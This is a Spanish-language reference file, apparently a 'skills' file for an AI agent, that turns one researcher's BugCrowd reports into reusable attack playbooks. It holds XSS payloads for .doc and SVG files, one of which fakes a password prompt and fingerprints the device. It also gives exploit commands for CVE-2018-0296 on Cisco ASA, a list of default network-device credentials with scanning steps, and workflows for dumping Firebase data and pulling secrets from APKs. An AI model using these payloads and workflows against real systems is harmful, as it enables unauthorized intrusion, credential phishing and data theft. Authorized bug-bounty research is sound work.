---
name: BugCrowd Bug Bounty Skills
description: Skills and techniques derived from omespino's real BugCrowd reports. Patterns, vectors, and methodologies that have produced confirmed findings.
type: reference
---

## Perfil de hallazgos (BugCrowd)

- **Programas:** Atlassian, y otros (en construcción)

- **Resueltos confirmados hasta ahora:** Atlassian ($300), Centrify ($100), Skyscanner (duplicate, P2), Netflix (informational, P3), Segment (duplicate, P3), Trello (resolved duplicate, P3), Tesla (informational, P5)

---

## Skills confirmados (reportes resueltos)

### 1. Stored XSS via Word 97-2003 (.doc) — javascript: URI en hyperlinks — iOS browsers
**Reward:** $300 | **Target:** Atlassian Confluence (api.media.atlassian.com) | **Fecha:** Feb 2018

- Crear documento Word con hipervínculo apuntando a `javascript:alert(1)//%22onclick=alert(2)//`
- **Crítico:** guardar obligatoriamente como "Word 97-2003 Document" (.doc) — el formato .docx NO reproduce el bug
- Subir el .doc como comentario en una página pública de Confluence con permisos de usuario anónimo
- Copiar la URL del documento y abrirla en cualquier browser iOS (Safari, Firefox, Chrome, Opera)
- El XSS se ejecuta al hacer clic en el hipervínculo — no requiere login si la página es pública
- **Targets ideales:** Plataformas con visor de documentos Office en iOS, páginas con comentarios anónimos, wikis corporativos (Confluence, SharePoint)
- **Variante conocida:** payload con doble bypass `javascript:alert(1)//%22onclick=alert(2)//` evade filtros básicos de javascript: URI

### 2. CVE-2018-0296 — Cisco ASA Path Traversal sin autenticación
**Reward:** $100 | **Target:** Centrify (remote.centrify.com) | **Fecha:** Jun 2018

- Cisco ASA vulnerable a directory traversal que expone información sensible del sistema sin autenticación
- Información expuesta: sesiones activas, usuarios activos, índice de directorios
- Identificar el target: buscar `/+CSCOE+/logon.html` en la URL — indica Cisco ASA
- **Exploit:**
  ```bash
  git clone https://github.com/yassineaboukir/CVE-2018-0296
  cd CVE-2018-0296 && python cisco_asa.py https://target.com/
  ```
- **Confirmado en dos programas distintos:** Criteo (HackerOne) y Centrify (BugCrowd) — técnica de alto rendimiento en empresas con infraestructura VPN/ASA legacy
- **Herramienta rápida:** `nuclei -t cves/2018/CVE-2018-0296.yaml -u https://target.com`
- **Targets ideales:** Empresas con VPN corporativa Cisco ASA, portales de acceso remoto (`remote.*`, `vpn.*`, `access.*`)

### 3. Firebase database exposed via APK reverse engineering
**Reward:** 5pts (duplicate) | **Target:** Skyscanner Android | **Fecha:** Nov 2018 | **Priority:** P2

- Extraer APK del dispositivo y decompilarlo para encontrar URLs de Firebase hardcodeadas
- **Workflow completo:**
  ```bash
  # 1. Extraer APK
  adb pull data/app/<package.name>/base.apk

  # 2. Decompilar
  apktool d base.apk

  # 3. Buscar Firebase URL
  grep -ir firebase base/ | grep http

  # 4. Verificar misconfiguration (base de datos pública)
  curl -X GET https://<proyecto>.firebaseio.com/.json
  ```
- Si responde con datos JSON → base de datos completamente expuesta sin autenticación
- La URL de Firebase suele estar en `AndroidManifest.xml` o en archivos de configuración dentro del APK
- **Targets ideales:** Apps móviles Android de empresas grandes, especialmente si usan Firebase como backend
- **Variante:** buscar también `google-services.json` dentro del APK descompilado — contiene project ID y API keys
- **Nota:** P2 confirmado válido aunque fue duplicate — indica que es un hallazgo de alto impacto buscado activamente

### 4. Default credentials en network equipment — Huawei switch expuesto
**Reward:** 10pts (informational) | **Target:** Netflix CIDR (45.57.51.45) | **Fecha:** Ago 2019 | **Priority:** P3

- Identificar interfaces de administración de switches/routers expuestas en rangos CIDR del target
- **Workflow:**
  ```bash
  # 1. Confirmar dueño del IP/rango
  whois <IP> | grep -i "CIDR\|organization"

  # 2. Escanear puertos de administración en el rango
  nmap -p 80,443,8080,8443,23,22 <CIDR> --open

  # 3. Identificar el modelo del equipo por la página de login

  # 4. Probar credenciales por defecto según fabricante
  ```
- **Credenciales Huawei S7706 por defecto:** `admin` / `admin@huawei.com`
- Otros defaults comunes de red: Cisco (`cisco/cisco`, `admin/admin`), Juniper (`root/` sin password), Netgear (`admin/password`)
- **Targets ideales:** CIDRs corporativos grandes, IPs de ASN del target (obtener con `whois` o `bgp.he.net`)
- **Herramientas:** `shodan.io` (filtrar por `org:"Netflix"` + `port:443` + `product:"Huawei"`), `masscan`, `nmap`
- **Nota:** Aunque fue informational en Netflix, el acceso administrativo completo a un switch de red es un hallazgo crítico en otros programas

### 5. Privilege escalation via falta de verificación de dominio de email
**Reward:** 2pts (duplicate) | **Target:** Segment (app.segment.com) | **Fecha:** Dic 2018 | **Priority:** P3

- Plataformas SaaS B2B que asocian workspaces/organizaciones al dominio del email sin verificar propiedad real
- **Técnica:** registrarse con `cualquier@dominio-del-target.com` (ej. `omespino@segment.com`) sin confirmar ownership del dominio
- **Impacto:** acceso o conexión a recursos de la organización víctima (websites, dashboards, billing) usando email falso de su dominio
- **Variantes a probar:**
  - `admin@target.com`, `webmaster@target.com`, `help@target.com`, `security@target.com`
  - Registrarse con email del dominio del propio programa de bug bounty
- **Targets ideales:** Plataformas SaaS con onboarding por dominio de email (analytics, marketing, CRM, CDPs como Segment, Mixpanel, HubSpot)
- **Indicador:** durante el signup, si la plataforma asocia automáticamente el workspace al dominio del email sin enviar verificación → vulnerable

### 6. Stored XSS via SVG en apps iOS — con payload de fingerprinting y phishing
**Reward:** 2pts (resolved duplicate) | **Target:** Trello iOS app v4.7.0 | **Fecha:** Dic 2018 | **Priority:** P3

- Misma técnica SVG/XML que Slack y Yahoo Mail (HackerOne) — confirma que el vector era generalizado en apps iOS de la época
- **Payload avanzado** que va más allá de `alert()` — incluye fingerprinting del dispositivo y phishing de contraseña:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <svg onload="alert(navigator.appVersion);
    var p=prompt('Session expired, insert your password');
    alert('password sent: '+p);
    var n={};for(var p in navigator){n[p]=navigator[p]};
    alert('fingerprint: '+JSON.stringify(n,null,2))"
    xmlns="http://www.w3.org/2000/svg">
  </svg>
  ```
- **Impacto demostrado en el reporte:**
  - Fingerprinting: iOS version, device model, idioma via objeto `navigator`
  - Phishing de credenciales: popup de "sesión expirada" para capturar contraseña
  - Geolocalización aproximada del usuario via IP
  - Detección de actividad del usuario (cuándo abre el archivo)
- **Vector de entrada:** attachment en tarjeta de Trello → abierto desde app iOS
- **Targets ideales:** Cualquier plataforma de colaboración/productividad con visor de archivos en iOS (Trello, Jira, Notion, Asana, Monday)
- **Nota de metodología:** usar payloads con impacto demostrable (fingerprinting, phishing) en lugar de solo `alert(1)` eleva la percepción de severidad del reporte

### 7. Stored XSS via SVG — variante xlink:href + data URI base64 (clickable)
**Reward:** ninguna (not-applicable) | **Target:** Atlassian Confluence iOS | **Fecha:** Nov 2018 | **Priority:** P2 sugerido

- Variante del SVG XSS que no requiere `onload` — usa elemento clickable con `xlink:href` apuntando a `data:text/html;base64,<payload>`
- Útil cuando filtros bloquean atributos de evento (`onload`, `onerror`) pero no `xlink:href`
- **Payload base:**
  ```xml
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <a xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
      <circle cx="225" cy="125" r="100" fill="brown"/>
      <text x="0" y="20" font-size="30">Click me</text>
    </a>
  </svg>
  ```
  *(el base64 decodifica a `<script>alert('xss')</script>`)*
- **Diferencia clave vs `onload`:** requiere clic del usuario pero evade filtros de event handlers
- **Targets ideales:** Plataformas que renderizan SVG con soporte de `xlink` pero filtran event attributes (Confluence, Jira, wikis corporativos)
- **Nota:** fue not-applicable en Atlassian posiblemente porque ya habían recibido el reporte del .doc — la técnica es válida

### 8. API keys expuestas en assets/ del APK — sin necesidad de decompilación
**Reward:** ninguna (informational) | **Target:** Tesla Android v3.3.1 | **Fecha:** Feb 2018 | **Priority:** P5

- Los APK son ZIP estándar — muchas apps guardan configs sensibles en `assets/` sin cifrar, accesibles con simple `unzip`
- **Workflow rápido (sin apktool):**
  ```bash
  unzip -d app-source com.target.app.apk
  # Buscar archivos de config en assets
  find app-source/assets/ -name "*.json" -o -name "*.env" -o -name "*.xml" | xargs grep -l "key\|secret\|token\|password\|api"
  ```
- **Archivos de alto valor a buscar:** `env.json`, `config.json`, `google-services.json`, `secrets.xml`, `BuildConfig`
- En Tesla: `assets/shared/env.json` contenía OAuth2 private keys (Doorkeeper)
- **Diferencia clave vs apktool:** `unzip` es suficiente para leer assets sin compilar — más rápido para reconocimiento inicial
- **Targets ideales:** Apps Android de empresas que usan frameworks JS (React Native, Ionic, Cordova) — suelen tener configs en `assets/`
- **Nota:** P5 en Tesla probablemente porque los keys tenían mitigaciones adicionales — en otros programas este tipo de exposición puede ser P1/P2
